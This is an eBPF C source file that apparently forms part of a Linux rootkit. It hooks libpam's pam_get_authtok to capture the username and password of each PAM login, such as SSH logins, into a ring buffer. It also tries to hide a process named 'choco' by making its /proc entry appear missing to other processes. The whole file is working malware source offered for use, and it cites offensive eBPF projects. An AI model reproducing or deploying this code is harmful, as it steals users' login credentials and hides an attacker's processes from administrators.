/* SPDX-License-Identifier: GPL-2.0 */
#include "vmlinux.h"
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <linux/errno.h>

// references:
// https://github.com/pathtofile/bad-bpf/tree/main
// https://github.com/Esonhugh/sshd_backdoor/tree/Skyworship
// https://github.com/bfengj/eBPFeXPLOIT
extern int bpf_strstr(const char *s1__ign, const char *s2__ign) __ksym __weak;
#include "event.h"
#include "sshBackdoor.h"
// SEC("uprobe/pam_get_authtok")
SEC("uprobe//usr/lib/libpam.so.0:pam_get_authtok")
int BPF_KPROBE(AuthtokEnter, struct pam_handle *pamh, int item,
               const char **authtok, const char *promt) {
  pid_t pid = bpf_get_current_pid_tgid() >> 32;

  bpf_printk("new PAM connection! %d\n", pid);
  bpf_map_update_elem(&pamHandleMap, &pid, &pamh, BPF_ANY);
  bpf_map_update_elem(&authtokMap, &pid, &authtok,
                      BPF_ANY); // start tracking pam

  return 0;
}
struct openat_args {
  const char *filename;
};

#define HIDEPROCNAME "choco"
pid_t HIDEMEPROCPID = 0;

SEC("uretprobe//usr/lib/libpam.so.0:pam_get_authtok")
int BPF_KRETPROBE(AuthtokExist, int ret) {
  pid_t pid = bpf_get_current_pid_tgid() >> 32;
  pam_handle_t **pamHandlePtr = bpf_map_lookup_elem(&pamHandleMap, &pid);
  if (pamHandlePtr == 0)
    return 0;
  char ***authtokPtr = bpf_map_lookup_elem(&authtokMap, &pid);
  if (authtokPtr == 0)
    return 0;
  struct pam_handle *pamh = NULL;
  char **authtok = NULL;
  pamh = *pamHandlePtr;
  authtok = *authtokPtr;
  if (pamh == NULL || authtok == NULL)
    return 0;
  char *userPtr = NULL;
  char *passPtr = NULL;
  struct sshUserPass *sshUserPass;
  sshUserPass = bpf_ringbuf_reserve(&rb, sizeof(*sshUserPass), 0);
  if (!sshUserPass) {
    bpf_map_delete_elem(&pamHandleMap, &pid);
    bpf_map_delete_elem(&authtokMap, &pid);
    return 0;
  }
  sshUserPass->type = 2;
  bpf_probe_read_user(&userPtr, sizeof(userPtr), &pamh->user);
  bpf_probe_read_user_str(&sshUserPass->username, MAX_USERNAME_LEN, userPtr);
  bpf_probe_read_user(&passPtr, sizeof(passPtr), authtok);
  bpf_probe_read_user_str(&sshUserPass->password, MAX_PASSWORD_LEN, passPtr);
  bpf_ringbuf_submit(sshUserPass, 0);
  bpf_map_delete_elem(&pamHandleMap, &pid);
  bpf_map_delete_elem(&authtokMap, &pid);
  bpf_printk("captured credentials!\n");
  return 0;
}
struct process_event {
  __u32 pid;
  char comm[TASK_COMM_LEN];
};
SEC("tp/sched/sched_process_exec")
int handle_exec(struct trace_event_raw_sched_process_exec *ctx) {
  struct process_event evt = {};

  struct task_struct *task;
  pid_t pid = bpf_get_current_pid_tgid() >> 32;
  task = (struct task_struct *)bpf_get_current_task();
  evt.pid = pid;
  if (HIDEMEPROCPID != 0) {
    return 0;
  }
  bpf_get_current_comm(&evt.comm, sizeof(evt.comm));
  if (bpf_strstr(evt.comm, HIDEPROCNAME)) {
    HIDEMEPROCPID = pid;
  }
  return 0;
}

SEC("tp/sched/sched_process_exit")
int handle_exec_exit(struct trace_event_raw_sched_process_template *ctx) {
  pid_t pid = bpf_get_current_pid_tgid() >> 32;
  if (pid == HIDEMEPROCPID && HIDEMEPROCPID != 0) {
    HIDEMEPROCPID = 0;
  }
  return 0;
}

SEC("tracepoint/syscalls/sys_enter_openat")
int hideME(struct trace_event_raw_sys_enter *ctx) {

  pid_t pid = bpf_get_current_pid_tgid() >> 32;

  if (HIDEMEPROCPID == 0 || pid == HIDEMEPROCPID) {
    return 0;
  }

  char filename[64] = {};
  const char *filename_ptr = (const char *)ctx->args[1];
  bpf_probe_read_user_str(filename, sizeof(filename), filename_ptr);

  char target[64] = {};
  __u64 hidden = (__u64)HIDEMEPROCPID;
  bpf_snprintf(target, sizeof(target), "/proc/%d", &hidden, sizeof(hidden));

  // bpf_printk("%s\n", filename);
  // bpf_printk("%s\n", target);
  if (__builtin_memcmp(filename, target, sizeof(target)) == 0) {
    bpf_printk("%s\n", filename);
    return -ENOENT;
  }

  return 0;
}

char LICENSE[] SEC("license") = "GPL";
